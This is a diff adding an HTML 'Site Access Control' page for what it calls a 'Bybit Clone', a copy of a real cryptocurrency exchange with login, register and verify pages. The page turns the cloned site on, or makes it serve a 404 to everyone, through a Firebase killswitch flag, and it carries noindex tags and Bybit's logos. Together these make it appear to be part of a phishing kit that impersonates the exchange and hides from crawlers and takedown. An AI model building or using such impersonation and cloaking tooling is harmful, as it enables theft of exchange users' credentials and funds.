@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Site Access | Bybit Clone</title>
+  <!-- Site icon (favicon) -->
+  <link rel="icon" href="/favicon.ico" sizes="any">
+  <link rel="icon" type="image/png" sizes="any" href="assets/img/bybit-seeklogo.png">
+  <link rel="apple-touch-icon" href="assets/img/bybit-seeklogo.png">
+  <meta name="theme-color" content="#0b0e11">
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="stylesheet" href="assets/css/styles.css">
+  <style>
+    .act-main{max-width:520px;margin:0 auto;padding:56px 24px 80px}
+    .act-hdr{display:flex;align-items:center;gap:12px;margin-bottom:26px}
+    .act-hdr img{height:26px}
+    .act-hdr h1{font-size:18px;font-weight:600;color:var(--black)}
+    .act-card{background:#fff;border:1px solid var(--border);border-radius:14px;padding:22px;margin-bottom:16px}
+    .act-row{display:flex;align-items:center;justify-content:space-between;gap:14px;flex-wrap:wrap}
+    .act-lbl{font-size:13px;font-weight:600;color:var(--black)}
+    .act-hint{font-size:12px;color:var(--g3);margin-top:4px;line-height:1.55}
+    .act-pill{display:inline-flex;align-items:center;gap:7px;font-size:12px;font-weight:700;letter-spacing:.4px;
+      padding:7px 13px;border-radius:999px;text-transform:uppercase}
+    .act-pill::before{content:"";width:8px;height:8px;border-radius:50%;background:currentColor}
+    .act-pill.on{color:var(--green);background:rgba(6,193,103,.1)}
+    .act-pill.off{color:var(--red);background:rgba(246,54,73,.1)}
+    .act-btn{height:44px;padding:0 20px;border-radius:10px;font-size:14px;font-weight:700;color:#fff;
+      background:var(--black);transition:opacity .15s}
+    .act-btn:hover{opacity:.86}
+    .act-btn.hot{background:var(--green)}
+    .act-btn:disabled{opacity:.45;cursor:not-allowed}
+    .act-btn.ghost{background:#fff;color:var(--black);border:1px solid var(--border)}
+    .act-act{display:flex;gap:10px;flex-wrap:wrap;margin-top:18px}
+    .act-act .act-btn{flex:1}
+    #actErr{color:var(--red);font-size:13px;margin-top:14px}
+    .act-note{margin-top:18px;padding:16px 18px;background:var(--bg2);border-radius:12px;font-size:12.5px;
+      line-height:1.65;color:var(--g2)}
+    .act-note b{color:var(--black)}
+  </style>
+</head>
+
+<body>
+  <main class="act-main">
+    <div class="act-hdr">
+      <img src="assets/img/auth-lightlogo.png" alt="BYBIT">
+      <h1>Site Access Control</h1>
+    </div>
+
+    <div class="act-card">
+      <div class="act-row">
+        <div>
+          <div class="act-lbl">Main site</div>
+          <div class="act-hint">index · login · register · verify</div>
+        </div>
+        <span class="act-pill off" id="actMainState">Offline</span>
+      </div>
+      <div class="act-row" style="margin-top:16px">
+        <div>
+          <div class="act-lbl">Admin dashboard</div>
+          <div class="act-hint">/admin</div>
+        </div>
+        <span class="act-pill off" id="actAdminState">Offline</span>
+      </div>
+      <div class="act-act">
+        <button class="act-btn hot" id="actOn" type="button">Activate site</button>
+        <button class="act-btn ghost" id="actOff" type="button">Take offline (404)</button>
+      </div>
+      <div id="actErr"></div>
+    </div>
+
+    <div class="act-note">
+      <b>How this works.</b> Every page loads <code>killswitch.js</code> first, which reads
+      <code>siteStatus/active</code> from the Realtime Database. While that value is not exactly
+      <code>true</code>, the page is replaced with a 404 before anything renders. Only the admin
+      account can change the flag — everyone else sees a dead site.
+    </div>
+  </main>
+
+  <script src="assets/js/firebase/firebase-app-compat.js"></script>
+  <script src="assets/js/firebase/firebase-auth-compat.js"></script>
+  <script src="assets/js/firebase/firebase-database-compat.js"></script>
+  <script src="assets/js/firebase/firebase-init.js?v=6"></script>
+  <script src="assets/js/activate.js?v=2"></script>
+</body>
+
+</html>
+
